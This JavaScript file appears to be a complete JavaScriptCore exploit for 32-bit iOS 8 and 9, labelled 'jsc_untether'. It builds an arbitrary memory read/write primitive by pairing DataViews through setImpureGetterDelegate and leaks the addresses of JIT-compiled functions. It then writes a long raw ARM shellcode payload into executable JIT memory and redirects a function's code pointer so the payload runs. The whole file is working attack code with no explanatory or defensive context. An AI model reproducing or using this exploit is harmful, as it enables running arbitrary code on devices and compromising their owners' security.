const DV_ARRAYBUFFER_OFFSET = 0x10;
const DV_BYTELENGTH_OFFSET = DV_ARRAYBUFFER_OFFSET + 4;
const DV_MODE_OFFSET = DV_BYTELENGTH_OFFSET + 4;
const FAST_TYPED_ARRAY_MODE = 0;

var Memory = function() {
    this.read32 = function(addr) { return dv_rw.getUint32(addr, true); }
    this.write32 = function(addr, data) { dv_rw.setUint32(addr, data, true); }
}

var Utils = function() {
    this.print = function(msg) { debug(msg) }; 
    this.hex32 = function(num) {
        num = num >>> 0;
        var hex_str = num.toString(16);
        while (hex_str.length < 8) {
            hex_str = '0' + hex_str;
        }
        return '0x' + hex_str;
    }

    this.quit_jsc = function() {
        try {
            quit();
        } catch(err) {
            var quit = JSC_HAXX;
        }
    }

    this.get_cpu_arch = function() {
        var output = describe(debug);
        var addr = output.match(/0x[0-9a-fA-F]+/);
    
        if (addr != 0) {
            var addr_len = addr[0].length - 2;
            if (addr_len >= 8) return "arm64";
            return "armv7";
        }
        return "unknown";
    }

    this.get_ios_version = function() {
        try {
            gcHeapSize(); // only exist on ios 9+
            return 9
        } catch(err) {
            return 8;
        }
    }
}

var util = new Utils();
var mem = new Memory();

var rw_buf = new ArrayBuffer(0x20);
var dv_init = new DataView(rw_buf);
var dv_rw = new DataView(rw_buf);
setImpureGetterDelegate(dv_init, dv_rw);

dv_init.setUint32(DV_ARRAYBUFFER_OFFSET, 0, true);
dv_init.setUint32(DV_BYTELENGTH_OFFSET, 0xffffffff, true);
dv_init.setUint32(DV_MODE_OFFSET, 0, true);

var rw_buf = new ArrayBuffer(0x20);
var dv_leak_addr = new DataView(rw_buf);
var dv_leak = new DataView(rw_buf);
setImpureGetterDelegate(dv_leak, dv_leak_addr);

var body = '';
for (var i = 0; i < 0x100; i++){
    body += 'try {} catch(e){};';
}

var jit_func1 = new Function('a', body);
for (var i = 0; i< 0x10000; i++){
    jit_func1();
}

var cpu_arch = util.get_cpu_arch();
var ios_version = util.get_ios_version();

util.print("[*] jsc_untether [*]");
util.print("cpu arch: " + cpu_arch);
util.print("ios version: " + ios_version);

setImpureGetterDelegate(dv_leak_addr, jit_func1);
jit_addr1 = dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
util.print("jit_addr1: " + util.hex32(jit_addr1));
var shellcode = 0;

if (ios_version >= 9) {
    var shellcode_ptr = mem.read32(mem.read32(mem.read32(jit_addr1))+0x38);
    if (shellcode_ptr >= 0xfffff) {
        shellcode = mem.read32(shellcode_ptr+0xfc); // ios 9.0-9.2.1
        if (shellcode < 0xfffffff) shellcode = mem.read32(shellcode_ptr+0xcc); // ios 9.3-9.3.1
    }

    // ios 9.3.2+
    if (shellcode < 0xfffffff) {
        shellcode_ptr = mem.read32(jit_addr1+0x14);
        shellcode = (mem.read32(shellcode_ptr+0x18)&0xfffff000)+0x80000;
    }

    util.print("shellcode_ptr: " + util.hex32(shellcode_ptr));
    util.print("shellcode: " + util.hex32(shellcode));
} else {
    var shellcode_ptr = mem.read32(jit_addr1+0x14);
    util.print("shellcode_ptr: " + util.hex32(shellcode_ptr));
    shellcode = (mem.read32(shellcode_ptr+0x20)&0xfffff000)+0x80000;
    util.print("shellcode: " + util.hex32(shellcode));
}

var body = '';
for (var i = 0; i < 0x100; i++) {
    body += 'try {} catch(e){};';
}

var jit_func2 = new Function('a', body);
for (var i = 0; i< 0x10000; i++) {
    jit_func2();
}

setImpureGetterDelegate(dv_leak_addr, jit_func2);
jit_addr2 = dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
util.print("jit_addr2: " + util.hex32(jit_addr2));
mem.write32(shellcode + 0, 0xe3b00000);
mem.write32(shellcode + 4, 0xe3b01002);
mem.write32(shellcode + 8, 0xe3b02064);
mem.write32(shellcode + 12, 0xe3e0c03c);
mem.write32(shellcode + 16, 0xef000080);
mem.write32(shellcode + 20, 0xe28fcf7a);
mem.write32(shellcode + 24, 0xe12fff3c);
mem.write32(shellcode + 28, 0xe1a0100d);
mem.write32(shellcode + 32, 0xe3a02701);
mem.write32(shellcode + 36, 0xe3b03000);
mem.write32(shellcode + 40, 0xe3b04001);
mem.write32(shellcode + 44, 0xe3b05000);
mem.write32(shellcode + 48, 0xe3b06001);
mem.write32(shellcode + 52, 0xe28fcf75);
mem.write32(shellcode + 56, 0xe12fff3c);
mem.write32(shellcode + 60, 0xe59d0000);
mem.write32(shellcode + 64, 0xe3500000);
mem.write32(shellcode + 68, 0x0a000148);
mem.write32(shellcode + 72, 0xe2800801);
mem.write32(shellcode + 76, 0xe1a0d000);
mem.write32(shellcode + 80, 0xe3b00000);
mem.write32(shellcode + 84, 0xe1a01000);
mem.write32(shellcode + 88, 0xe1a02000);
mem.write32(shellcode + 92, 0xe1a03000);
mem.write32(shellcode + 96, 0xe1a04000);
mem.write32(shellcode + 100, 0xe1a05000);
mem.write32(shellcode + 104, 0xe1a06000);
mem.write32(shellcode + 108, 0xe1a07000);
mem.write32(shellcode + 112, 0xe1a08000);
mem.write32(shellcode + 116, 0xe1a09000);
mem.write32(shellcode + 120, 0xe1a0a000);
mem.write32(shellcode + 124, 0xe1a0b000);
mem.write32(shellcode + 128, 0xe1a0c000);
mem.write32(shellcode + 132, 0xe28fcfb1);
mem.write32(shellcode + 136, 0xe12fff3c);
mem.write32(shellcode + 140, 0xe3000578);
mem.write32(shellcode + 144, 0xe3400000);
mem.write32(shellcode + 148, 0xe24fc09c);
mem.write32(shellcode + 152, 0xe080000c);
mem.write32(shellcode + 156, 0xe3b01000);
mem.write32(shellcode + 160, 0xe28fcf4e);
mem.write32(shellcode + 164, 0xe12fff3c);
mem.write32(shellcode + 168, 0xe3500000);
mem.write32(shellcode + 172, 0xda00012e);
mem.write32(shellcode + 176, 0xe1a0a000);
mem.write32(shellcode + 180, 0xe3b01000);
mem.write32(shellcode + 184, 0xe3b02000);
mem.write32(shellcode + 188, 0xe3b03002);
mem.write32(shellcode + 192, 0xe28fcf49);
mem.write32(shellcode + 196, 0xe12fff3c);
mem.write32(shellcode + 200, 0xe3500000);
mem.write32(shellcode + 204, 0xda000126);
mem.write32(shellcode + 208, 0xe1a0b000);
mem.write32(shellcode + 212, 0xe1a0000a);
mem.write32(shellcode + 216, 0xe3b01000);
mem.write32(shellcode + 220, 0xe3b02000);
mem.write32(shellcode + 224, 0xe3b03000);
mem.write32(shellcode + 228, 0xe28fcc01);
mem.write32(shellcode + 232, 0xe12fff3c);
mem.write32(shellcode + 236, 0xe28fce11);
mem.write32(shellcode + 240, 0xe12fff3c);
mem.write32(shellcode + 244, 0xe1a0100d);
mem.write32(shellcode + 248, 0xe3a02502);
mem.write32(shellcode + 252, 0xe3b03000);
mem.write32(shellcode + 256, 0xe3b04001);
mem.write32(shellcode + 260, 0xe3b05000);
mem.write32(shellcode + 264, 0xe3b06001);
mem.write32(shellcode + 268, 0xe28fc0fc);
mem.write32(shellcode + 272, 0xe12fff3c);
mem.write32(shellcode + 276, 0xe59d0000);
mem.write32(shellcode + 280, 0xe3500000);
mem.write32(shellcode + 284, 0x0a000112);
mem.write32(shellcode + 288, 0xe1a07000);
mem.write32(shellcode + 292, 0xe24f0f4b);
mem.write32(shellcode + 296, 0xe320f000);
mem.write32(shellcode + 300, 0xe3001fff);
mem.write32(shellcode + 304, 0xe1e01001);
mem.write32(shellcode + 308, 0xe0000001);
mem.write32(shellcode + 312, 0xe2800a02);
mem.write32(shellcode + 316, 0xe1a06000);
mem.write32(shellcode + 320, 0xe1a01000);
mem.write32(shellcode + 324, 0xe1a0000a);
mem.write32(shellcode + 328, 0xe1a0200b);
mem.write32(shellcode + 332, 0xe28fc0a4);
mem.write32(shellcode + 336, 0xe12fff3c);
mem.write32(shellcode + 340, 0xf57ff04f);
mem.write32(shellcode + 344, 0xe320f000);
mem.write32(shellcode + 348, 0xe1a0a006);
mem.write32(shellcode + 352, 0xe287b702);
mem.write32(shellcode + 356, 0xe28fcfa2);
mem.write32(shellcode + 360, 0xe12fff3c);
mem.write32(shellcode + 364, 0xe3500000);
mem.write32(shellcode + 368, 0x0a0000fd);
mem.write32(shellcode + 372, 0xe1a08000);
mem.write32(shellcode + 376, 0xe92d0d00);
mem.write32(shellcode + 380, 0xe28fcfd1);
mem.write32(shellcode + 384, 0xe12fff3c);
mem.write32(shellcode + 388, 0xe8bd0d00);
mem.write32(shellcode + 392, 0xe58ba000);
mem.write32(shellcode + 396, 0xe3b00001);
mem.write32(shellcode + 400, 0xe58b0004);
mem.write32(shellcode + 404, 0xe28b001c);
mem.write32(shellcode + 408, 0xe58b0008);
mem.write32(shellcode + 412, 0xe58b0014);
mem.write32(shellcode + 416, 0xe3b00000);
mem.write32(shellcode + 420, 0xe58b000c);
mem.write32(shellcode + 424, 0xe58b0010);
mem.write32(shellcode + 428, 0xe58b0018);
mem.write32(shellcode + 432, 0xe3000588);
mem.write32(shellcode + 436, 0xe3400000);
mem.write32(shellcode + 440, 0xe24fcd07);
mem.write32(shellcode + 444, 0xe080000c);
mem.write32(shellcode + 448, 0xe58b001c);
mem.write32(shellcode + 452, 0xe1a0c008);
mem.write32(shellcode + 456, 0xe1a0d00b);
mem.write32(shellcode + 460, 0xe12fff1c);
mem.write32(shellcode + 464, 0xe3b00000);
mem.write32(shellcode + 468, 0xe3a0c001);
mem.write32(shellcode + 472, 0xef000080);
mem.write32(shellcode + 476, 0xe320f000);
mem.write32(shellcode + 480, 0xe3a0c005);
mem.write32(shellcode + 484, 0xef000080);
mem.write32(shellcode + 488, 0xe12fff1e);
mem.write32(shellcode + 492, 0xe3a0c0c7);
mem.write32(shellcode + 496, 0xef000080);
mem.write32(shellcode + 500, 0xe12fff1e);
mem.write32(shellcode + 504, 0xe3a0c003);
mem.write32(shellcode + 508, 0xef000080);
mem.write32(shellcode + 512, 0xe12fff1e);
mem.write32(shellcode + 516, 0xe3e0c01b);
mem.write32(shellcode + 520, 0xef000080);
mem.write32(shellcode + 524, 0xe12fff1e);
mem.write32(shellcode + 528, 0xe3e0c009);
mem.write32(shellcode + 532, 0xef000080);
mem.write32(shellcode + 536, 0xe12fff1e);
mem.write32(shellcode + 540, 0xe3e0c019);
mem.write32(shellcode + 544, 0xef000080);
mem.write32(shellcode + 548, 0xe12fff1e);
mem.write32(shellcode + 552, 0xe3e0c01a);
mem.write32(shellcode + 556, 0xef000080);
mem.write32(shellcode + 560, 0xe12fff1e);
mem.write32(shellcode + 564, 0xe3b05000);
mem.write32(shellcode + 568, 0xe3b06000);
mem.write32(shellcode + 572, 0xe3e0c01e);
mem.write32(shellcode + 576, 0xef000080);
mem.write32(shellcode + 580, 0xe12fff1e);
mem.write32(shellcode + 584, 0xe92d4080);
mem.write32(shellcode + 588, 0xe1a0700d);
mem.write32(shellcode + 592, 0xe24dd040);
mem.write32(shellcode + 596, 0xe1a04000);
mem.write32(shellcode + 600, 0xe24fc038);
mem.write32(shellcode + 604, 0xe12fff3c);
mem.write32(shellcode + 608, 0xe1500004);
mem.write32(shellcode + 612, 0x0a000012);
mem.write32(shellcode + 616, 0xe58d4008);
mem.write32(shellcode + 620, 0xe24fc058);
mem.write32(shellcode + 624, 0xe12fff3c);
mem.write32(shellcode + 628, 0xe58d000c);
mem.write32(shellcode + 632, 0xe1a04000);
mem.write32(shellcode + 636, 0xe3010511);
mem.write32(shellcode + 640, 0xe58d0000);
mem.write32(shellcode + 644, 0xe3b00018);
mem.write32(shellcode + 648, 0xe58d0004);
mem.write32(shellcode + 652, 0xe3b00000);
mem.write32(shellcode + 656, 0xe58d0010);
mem.write32(shellcode + 660, 0xe3a00ee1);
mem.write32(shellcode + 664, 0xe58d0014);
mem.write32(shellcode + 668, 0xe1a0000d);
mem.write32(shellcode + 672, 0xe3b01003);
mem.write32(shellcode + 676, 0xe3b02018);
mem.write32(shellcode + 680, 0xe3b0302c);
mem.write32(shellcode + 684, 0xe24fc080);
mem.write32(shellcode + 688, 0xe12fff3c);
mem.write32(shellcode + 692, 0xe3a00000);
mem.write32(shellcode + 696, 0xe28dd040);
mem.write32(shellcode + 700, 0xe8bd8080);
mem.write32(shellcode + 704, 0xe92d4080);
mem.write32(shellcode + 708, 0xe1a0700d);
mem.write32(shellcode + 712, 0xe24dd010);
mem.write32(shellcode + 716, 0xe58d0000);
mem.write32(shellcode + 720, 0xe58d1004);
mem.write32(shellcode + 724, 0xe300058c);
mem.write32(shellcode + 728, 0xe3400000);
mem.write32(shellcode + 732, 0xe24fcfb9);
mem.write32(shellcode + 736, 0xe080000c);
mem.write32(shellcode + 740, 0xe3b01002);
mem.write32(shellcode + 744, 0xe59dc000);
mem.write32(shellcode + 748, 0xe12fff3c);
mem.write32(shellcode + 752, 0xe30015b1);
mem.write32(shellcode + 756, 0xe3401000);
mem.write32(shellcode + 760, 0xe24fcc03);
mem.write32(shellcode + 764, 0xe081100c);
mem.write32(shellcode + 768, 0xe59dc004);
mem.write32(shellcode + 772, 0xe12fff3c);
mem.write32(shellcode + 776, 0xe3500000);
mem.write32(shellcode + 780, 0x0a00000d);
mem.write32(shellcode + 784, 0xe2408001);
mem.write32(shellcode + 788, 0xe5989000);
mem.write32(shellcode + 792, 0xe598a004);
mem.write32(shellcode + 796, 0xe1a00009);
mem.write32(shellcode + 800, 0xe28fcf59);
mem.write32(shellcode + 804, 0xe12fff3c);
mem.write32(shellcode + 808, 0xe1a05000);
mem.write32(shellcode + 812, 0xe1a0000a);
mem.write32(shellcode + 816, 0xe28fcf55);
mem.write32(shellcode + 820, 0xe12fff3c);
mem.write32(shellcode + 824, 0xe1a00800);
mem.write32(shellcode + 828, 0xe1800005);
mem.write32(shellcode + 832, 0xe0800008);
mem.write32(shellcode + 836, 0xe280000c);
mem.write32(shellcode + 840, 0xe28dd010);
mem.write32(shellcode + 844, 0xe8bd8080);
mem.write32(shellcode + 848, 0xe92d4080);
mem.write32(shellcode + 852, 0xe1a0700d);
mem.write32(shellcode + 856, 0xe24dd050);
mem.write32(shellcode + 860, 0xe24fcf52);
mem.write32(shellcode + 864, 0xe12fff3c);
mem.write32(shellcode + 868, 0xe1a04000);
mem.write32(shellcode + 872, 0xe58d000c);
mem.write32(shellcode + 876, 0xe24fce17);
mem.write32(shellcode + 880, 0xe12fff3c);
mem.write32(shellcode + 884, 0xe58d0008);
mem.write32(shellcode + 888, 0xe3010513);
mem.write32(shellcode + 892, 0xe58d0000);
mem.write32(shellcode + 896, 0xe3a00018);
mem.write32(shellcode + 900, 0xe58d0004);
mem.write32(shellcode + 904, 0xe3a00000);
mem.write32(shellcode + 908, 0xe58d0010);
mem.write32(shellcode + 912, 0xe3000d4a);
mem.write32(shellcode + 916, 0xe58d0014);
mem.write32(shellcode + 920, 0xe1a0000d);
mem.write32(shellcode + 924, 0xe3b01003);
mem.write32(shellcode + 928, 0xe3b02018);
mem.write32(shellcode + 932, 0xe3b03040);
mem.write32(shellcode + 936, 0xe24fcf5f);
mem.write32(shellcode + 940, 0xe12fff3c);
mem.write32(shellcode + 944, 0xe59db01c);
mem.write32(shellcode + 948, 0xe59da020);
mem.write32(shellcode + 952, 0xe35a0001);
mem.write32(shellcode + 956, 0xda00000a);
mem.write32(shellcode + 960, 0xe24aa001);
mem.write32(shellcode + 964, 0xf57ff04f);
mem.write32(shellcode + 968, 0xe35a0000);
mem.write32(shellcode + 972, 0xba000006);
mem.write32(shellcode + 976, 0xe3b04004);
mem.write32(shellcode + 980, 0xe005049a);
mem.write32(shellcode + 984, 0xe79b0005);
mem.write32(shellcode + 988, 0xe24aa001);
mem.write32(shellcode + 992, 0xe24fce1a);
mem.write32(shellcode + 996, 0xe12fff3c);
mem.write32(shellcode + 1000, 0xeafffff5);
mem.write32(shellcode + 1004, 0xe28dd050);
mem.write32(shellcode + 1008, 0xe8bd8080);
mem.write32(shellcode + 1012, 0xe92d4080);
mem.write32(shellcode + 1016, 0xe1a0700d);
mem.write32(shellcode + 1020, 0xe24ddd06);
mem.write32(shellcode + 1024, 0xe24fcf7b);
mem.write32(shellcode + 1028, 0xe12fff3c);
mem.write32(shellcode + 1032, 0xe1a04000);
mem.write32(shellcode + 1036, 0xe58d000c);
mem.write32(shellcode + 1040, 0xe24fcf85);
mem.write32(shellcode + 1044, 0xe12fff3c);
mem.write32(shellcode + 1048, 0xe58d0008);
mem.write32(shellcode + 1052, 0xe3010513);
mem.write32(shellcode + 1056, 0xe58d0000);
mem.write32(shellcode + 1060, 0xe3a00028);
mem.write32(shellcode + 1064, 0xe58d0004);
mem.write32(shellcode + 1068, 0xe3a00000);
mem.write32(shellcode + 1072, 0xe58d0010);
mem.write32(shellcode + 1076, 0xe3000d4d);
mem.write32(shellcode + 1080, 0xe58d0014);
mem.write32(shellcode + 1084, 0xe3a00000);
mem.write32(shellcode + 1088, 0xe58d0018);
mem.write32(shellcode + 1092, 0xe3a00011);
mem.write32(shellcode + 1096, 0xe58d0020);
mem.write32(shellcode + 1100, 0xe3a00005);
mem.write32(shellcode + 1104, 0xe58d0024);
mem.write32(shellcode + 1108, 0xe1a0000d);
mem.write32(shellcode + 1112, 0xe3b01003);
mem.write32(shellcode + 1116, 0xe3b02028);
mem.write32(shellcode + 1120, 0xe3b03f4f);
mem.write32(shellcode + 1124, 0xe24fcf8e);
mem.write32(shellcode + 1128, 0xe12fff3c);
mem.write32(shellcode + 1132, 0xe59d4028);
mem.write32(shellcode + 1136, 0xe320f000);
mem.write32(shellcode + 1140, 0xe5942014);
mem.write32(shellcode + 1144, 0xe320f000);
mem.write32(shellcode + 1148, 0xe2820a01);
mem.write32(shellcode + 1152, 0xe320f000);
mem.write32(shellcode + 1156, 0xe28ddd06);
mem.write32(shellcode + 1160, 0xe8bd8080);
mem.write32(shellcode + 1164, 0xe1a01820);
mem.write32(shellcode + 1168, 0xe30f4fff);
mem.write32(shellcode + 1172, 0xe0011004);
mem.write32(shellcode + 1176, 0xe0002004);
mem.write32(shellcode + 1180, 0xe202300f);
mem.write32(shellcode + 1184, 0xe1a03603);
mem.write32(shellcode + 1188, 0xe2024b01);
mem.write32(shellcode + 1192, 0xe1a04084);
mem.write32(shellcode + 1196, 0xe1833004);
mem.write32(shellcode + 1200, 0xe2014a07);
mem.write32(shellcode + 1204, 0xe1a04224);
mem.write32(shellcode + 1208, 0xe1833004);
mem.write32(shellcode + 1212, 0xe20140ff);
mem.write32(shellcode + 1216, 0xe1830004);
mem.write32(shellcode + 1220, 0xe12fff1e);
mem.write32(shellcode + 1224, 0xe92d4080);
mem.write32(shellcode + 1228, 0xe1a0700d);
mem.write32(shellcode + 1232, 0xe24dd020);
mem.write32(shellcode + 1236, 0xe2408a01);
mem.write32(shellcode + 1240, 0xe58d8000);
mem.write32(shellcode + 1244, 0xe1a01008);
mem.write32(shellcode + 1248, 0xe3056f5f);
mem.write32(shellcode + 1252, 0xe3466f63);
mem.write32(shellcode + 1256, 0xe3057f5f);
mem.write32(shellcode + 1260, 0xe3447144);
mem.write32(shellcode + 1264, 0xe2888001);
mem.write32(shellcode + 1268, 0xe5985000);
mem.write32(shellcode + 1272, 0xe1550006);
mem.write32(shellcode + 1276, 0x1afffffb);
mem.write32(shellcode + 1280, 0xe2888010);
mem.write32(shellcode + 1284, 0xe5985000);
mem.write32(shellcode + 1288, 0xe1550007);
mem.write32(shellcode + 1292, 0x0a000000);
mem.write32(shellcode + 1296, 0xeafffff6);
mem.write32(shellcode + 1300, 0xe2888018);
mem.write32(shellcode + 1304, 0xe5988000);
mem.write32(shellcode + 1308, 0xe0888001);
mem.write32(shellcode + 1312, 0xe288002c);
mem.write32(shellcode + 1316, 0xe5900000);
mem.write32(shellcode + 1320, 0xe3500000);
mem.write32(shellcode + 1324, 0x0a00000e);
mem.write32(shellcode + 1328, 0xe58d0004);
mem.write32(shellcode + 1332, 0xe2880034);
mem.write32(shellcode + 1336, 0xe5900000);
mem.write32(shellcode + 1340, 0xe3500000);
mem.write32(shellcode + 1344, 0x0a000009);
mem.write32(shellcode + 1348, 0xe1a01000);
mem.write32(shellcode + 1352, 0xe59d0004);
mem.write32(shellcode + 1356, 0xe24fcfa5);
mem.write32(shellcode + 1360, 0xe12fff3c);
mem.write32(shellcode + 1364, 0xe3500000);
mem.write32(shellcode + 1368, 0x0a000001);
mem.write32(shellcode + 1372, 0xe3b01000);
mem.write32(shellcode + 1376, 0xe5801000);
mem.write32(shellcode + 1380, 0xe28dd020);
mem.write32(shellcode + 1384, 0xe8bd8080);
mem.write32(shellcode + 1388, 0xe3b00000);
mem.write32(shellcode + 1392, 0xe3a0c001);
mem.write32(shellcode + 1396, 0xef000080);
mem.write32(shellcode + 1400, 0x6576652f);
mem.write32(shellcode + 1404, 0x746e7572);
mem.write32(shellcode + 1408, 0x65687465);
mem.write32(shellcode + 1412, 0x00000072);
mem.write32(shellcode + 1416, 0x00000000);
mem.write32(shellcode + 1420, 0x7273752f);
mem.write32(shellcode + 1424, 0x62696c2f);
mem.write32(shellcode + 1428, 0x7379732f);
mem.write32(shellcode + 1432, 0x2f6d6574);
mem.write32(shellcode + 1436, 0x6462696c);
mem.write32(shellcode + 1440, 0x61707369);
mem.write32(shellcode + 1444, 0x2e686374);
mem.write32(shellcode + 1448, 0x696c7964);
mem.write32(shellcode + 1452, 0x00000062);
mem.write32(shellcode + 1456, 0x756f7600);
mem.write32(shellcode + 1460, 0x72656863);
mem.write32(shellcode + 1464, 0x7463615f);
mem.write32(shellcode + 1468, 0x74697669);
mem.write32(shellcode + 1472, 0x75625f79);
mem.write32(shellcode + 1476, 0x72656666);
mem.write32(shellcode + 1480, 0x6f6f685f);
mem.write32(shellcode + 1484, 0x6e695f6b);
mem.write32(shellcode + 1488, 0x6c617473);
mem.write32(shellcode + 1492, 0x6c345f6c);
mem.write32(shellcode + 1496, 0x72746269);
mem.write32(shellcode + 1500, 0x00656361);
mem.write32(shellcode + 1504, 0x00000000);
mem.write32(shellcode + 1508, 0x000002f4);
mem.write32(shellcode + 1512, 0x82000001);
mem.write32(shellcode + 1516, 0x000005b1);
mem.write32(shellcode + 1520, 0x12ffffff);
mem.write32(shellcode + 1524, 0x000002f0);
mem.write32(shellcode + 1528, 0x80000001);
mem.write32(shellcode + 1532, 0x00000000);
mem.write32(shellcode + 1536, 0x10ffffff);
mem.write32(shellcode + 1540, 0x000002d8);
mem.write32(shellcode + 1544, 0x82000001);
mem.write32(shellcode + 1548, 0x0000058c);
mem.write32(shellcode + 1552, 0x12ffffff);
mem.write32(shellcode + 1556, 0x000002d4);
mem.write32(shellcode + 1560, 0x80000001);
mem.write32(shellcode + 1564, 0x00000000);
mem.write32(shellcode + 1568, 0x10ffffff);
mem.write32(shellcode + 1572, 0x000001b4);
mem.write32(shellcode + 1576, 0x82000001);
mem.write32(shellcode + 1580, 0x00000588);
mem.write32(shellcode + 1584, 0x12ffffff);
mem.write32(shellcode + 1588, 0x000001b0);
mem.write32(shellcode + 1592, 0x80000001);
mem.write32(shellcode + 1596, 0x00000000);
mem.write32(shellcode + 1600, 0x10ffffff);
mem.write32(shellcode + 1604, 0x00000090);
mem.write32(shellcode + 1608, 0x82000001);
mem.write32(shellcode + 1612, 0x00000578);
mem.write32(shellcode + 1616, 0x12ffffff);
mem.write32(shellcode + 1620, 0x0000008c);
mem.write32(shellcode + 1624, 0x80000001);
mem.write32(shellcode + 1628, 0x00000000);
mem.write32(shellcode + 1632, 0x10ffffff);

if (ios_version >= 9) {
	mem.write32(jit_addr2, jit_addr2+0x4);
	mem.write32(jit_addr2+0x4, jit_addr2+0x4);
	mem.write32(jit_addr2+0x30, jit_addr2+0x1C);
	mem.write32(jit_addr2+0x34, shellcode);
} else {
	mem.write32(jit_addr2, jit_addr2+0x4);
	mem.write32(jit_addr2+0x4, jit_addr2+0x4);
	mem.write32(jit_addr2+0x08, shellcode);
	mem.write32(jit_addr2+0x30, jit_addr2+0x1C);
	mem.write32(jit_addr2+0x34, jit_addr2-0x14);
}

jit_func2();
